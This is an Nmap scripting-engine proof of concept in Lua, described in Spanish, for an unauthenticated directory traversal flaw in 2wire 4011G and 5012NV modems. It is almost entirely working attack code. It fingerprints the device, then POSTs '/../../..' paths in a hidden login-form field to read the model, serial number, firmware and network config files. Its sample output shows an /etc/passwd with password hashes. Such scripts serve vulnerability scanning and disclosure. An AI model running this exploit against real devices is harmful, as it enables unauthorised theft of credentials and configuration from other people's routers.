description = [[
2wire 4011G and 5012NV Directory Traversal Vulnerability PoC.

Afecta a estos modems y posiblemente otros con firmware 9.x.x.x

Existe una vulnerabilidad en el formulario de inicio de sesion del portal de configuracion por http de estos modems, especificamente en el control oculto llamado __ENH_ERROR_REDIRECT_PATH__ que no es validado correctamente en el servidor. Un atacante sin autenticacion puede manipular su valor para obtener del dispositivo archivos con contraseñas de fabrica en texto plano, configuraciones, etc.

El script identifica a los modelos afectados por el puerto 8080 tcp, este es utilizado por su bloqueador de URLs y el servidor se identifica como rhttpd. Despues checa que la configuracion este disponible por el puerto 80 tcp y trata de obtener cada archivo de LISTAARCH usando el metodo POST. Si el dispositivo es vulnerable se muestran los archivos obtenidos.

Referencia: http://abrdiaz.blogspot.mx/2012/12/vulnerabilidad-directory-traversal-en.html

]]

---
-- @usage
-- nmap --script http-2wire-dtvuln -p 8080 <target>
-- @output
-- PORT     STATE SERVICE
-- 8080/tcp open  http-proxy
-- | http-2wire-dtvuln: 
-- |   modem: 2wire
-- |   /var/etc/model_no: 4011G-001
-- |   /etc/firmware_version: 9.1.1.16
-- |   /etc/serialno: 09230A01230
-- |   /etc/passwd: root:$1$$4e9eZx73dg2OMyD6DG/Ir/:0:0:Mickey Mouse:/:/bin/sh
-- | bin:x:1:1:bin:/bin:/bin/sh:/bin/false
-- | daemon:x:2:2:daemon:/sbin:/bin/false
-- | nobody:x:99:99:Nobody:/home/www:/bin/false
-- | admin:$1$$Zw8ZNiDa1HCLFOoDPu0hr.:13356:13356:Linux User,,,:/:/usr/bin/kcli
-- | tech:$1$$4e9eZx73dg2OMyD6DG/Ir/:13357:13357:Linux User,,,:/:/usr/bin/kcli
-- |_rma:$1$$4e9eZx73dg2OMyD6DG/Ir/:0:0:Linux User,,,:/:/bin/sh

author = "Abraham Diaz (contacto en mi blog)"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}


local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"


local PREFIJO = "/../../.."
local LISTAARCH = {
	"/var/etc/model_no",
	"/etc/firmware_version",
	"/etc/serialno",
	"/tmp/ifcfg"
}


portrule = shortport.portnumber(8080,"tcp","open")


action = function(host,port)
	local exito = 0
	local respuesta = http.get(host,port,"/")
	if respuesta.status == 302 and respuesta.header.server == "rhttpd" then
		respuesta = http.get(host,80,"/xslt?PAGE=C_0_0")
		if respuesta.body and respuesta.status == 200 and respuesta.header.server == "Gateway-Webs" then
			local tabladatos = stdnse.output_table()
			tabladatos.modem = "2wire"
			local tablapost = {
				["__ENH_SHOW_REDIRECT_PATH__"] = "/pages/C_4_0.asp",
				["__ENH_SUBMIT_VALUE_SHOW__"] = "Acceder",
				["__ENH_ERROR_REDIRECT_PATH__"] = "",
				["username"] = "tech"
				}
			for _,archivo in ipairs(LISTAARCH) do
				tablapost["__ENH_ERROR_REDIRECT_PATH__"] = PREFIJO .. archivo
				respuesta = http.post(host,80,"/goform/enhAuthHandler",{},nil,tablapost)
				if respuesta.body and string.find(respuesta.body,"Error") == nil and string.find(respuesta.body,"html") == nil then
					tabladatos[archivo] = string.sub(respuesta.body,3) --por el CRLF extra en el cuerpo
					exito = exito + 1
				end
			end
			if exito > 0 then
				stdnse.print_verbose(1,"%s: %s es vulnerable. %d de %d archivos",SCRIPT_NAME,host.ip,exito,#LISTAARCH)
				return tabladatos
			end
		else
			--firewall activado u otro servidor, pero puede ser vulnerable
			stdnse.print_debug(1,"%s: %s configuracion no disponible en tcp 80.",SCRIPT_NAME,host.ip)
			return nil
		end
	end
	--no es 2wire o no se obtuvo ningun archivo
	stdnse.print_debug(1,"%s: %s NO es vulnerable.",SCRIPT_NAME,host.ip)
	return nil
end